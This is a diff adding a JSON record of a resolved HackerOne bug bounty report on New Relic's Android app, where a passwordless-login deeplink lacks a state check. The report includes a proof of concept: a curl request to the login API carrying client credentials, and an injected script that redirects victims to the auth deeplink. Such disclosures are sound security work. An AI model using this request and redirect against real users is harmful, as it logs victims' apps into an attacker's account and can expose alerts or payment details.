@@ -1,0 +1,128 @@
+{
+  "id": 957874,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTc4NzQ=",
+  "url": "https://hackerone.com/reports/957874",
+  "title": "Adding your account to victim's app via deeplink",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-13T16:58:50.750Z",
+  "submitted_at": "2020-08-13T16:58:50.787Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "batuhan",
+    "url": "/batuhan",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/030/9cd92c00a321c851be6949d9b7c7c031c13fef64_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-01-21T14:57:53.609Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-01-21T13:18:12.672Z",
+  "team_member_agreed_on_going_public_at": "2021-01-21T14:57:53.377Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "At your android app, there is a feature for passwordless login. It sends an email and if you click the link, it triggers a deeplink on the app for login.\n\nI think this feature needs a state control, for example setting `login_state_token=ABC` on the requester device and adding this `login_state_token` to deeplink too for checking it's integrity.\n\nAny attacker can authenticate her/his account into your device with the code below (the auth code extracted from email)\n```\n## Attacker requests an email from Newrelic and get's the special link\ncurl -H 'newrelic: eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMSIsImFwIjoiOTUyMzUiLCJpZCI6IjhjOWNiNzMzNGNmZmFlMmMiLCJ0ciI6ImQxZTAzNDgyNGJjNmYwM2QiLCJ0aSI6MTU5NzMzNjkyOTA5OX19' -H 'Content-Type: application/json; charset=UTF-8' -H 'Host: login.newrelic.com' -H 'User-Agent: okhttp/3.13.1' -H 'X-NewRelic-ID: VRUOVFRQDQ==' --data-binary '{\"auth_code\":\"\",\"email\":\"katircib@gmail.com\",\"password\":\"\",\"scheme\":\"newrelic\",\"client_id\":\"6dnR3wgNwgiI6yphqMI4GA==\",\"client_secret\":\"m/LU/NX77PiNiyGEAy4+0kuDuz7BszflpZlD5MzfpLgGlyDPYROBRVZYHO0ctB3sf84vElWqhBn7teqknVXuhw==\"}' --compressed 'https://login.newrelic.com/api/v1/authorization_codes'\n```\n```html\n<-- Attacker adds this link to webpage -->\n<script>\nwindow.location.href = \"newrelic://auth/UpBLbhtaVNi8NVIDLhrTZZHuZS1J3LrGypw7wN069cc0va0OzpWuNl7qIB0BI38ZdSHxS79h5HjUx%2B%2FyxccG%2FgEg8SFvl1HcoLk%2Bq1UMT4F2ALva30zlfjOmrFy4qzjrwDU%2FHTM46VHfpP%2B186q1nIttWU6BbQoaR9bwd4uw5S%2FXGXHCCgoeLGj6DIIG59fgE8v%2BOIT57Y4rgnXr1D9LVVTPPHCxw0VJTaHmpXM42nlx%2F2blPGvDjV%2FRRvuDcFx2zVVoCsw8tYMzC00yb2KvWQLirev4jLD47PXn2QZZ2huerG9eYjg5%2FwZCXkhJyvutEcCl7%2BgCgfHLvkPMR9Xdgw%3D%3D\"\n</script>\n```\n\n## Impact\n\nwhen attacker adds his/her account to your device, you will receive that accounts alerts too. if there is a payment page on mobile (I'm not sure), victim can add credit card info to attackers account etc.",
+  "bounty_amount": "100.01",
+  "formatted_bounty": "$100.01",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 947766,
+      "file_name": "Screen_Recording_2020-08-13_at_19.43.57.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/q4njztbERG36Y4AeRySWNQcj?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2020-08-13_at_19.43.57.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2020-08-13_at_19.43.57.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T135229Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a9d70ad92aff74f924fbb69fc0e1a1f826bcb7d821948834eaabd1fbf9f35591",
+      "file_size": 4629385,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-02-20T13:18:12.722Z",
+  "allow_singular_disclosure_after": -94005257.20133084,
+  "singular_disclosure_allowed": true,
+  "vote_count": 29,
+  "voters": [
+    "tolga",
+    "xploiterr",
+    "akshansh",
+    "mirhat",
+    "ali",
+    "batuhan",
+    "f_m",
+    "its_afolic",
+    "h4x0r_dz",
+    "sodium_",
+    "and 19 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 58811,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.newrelic.rpm",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
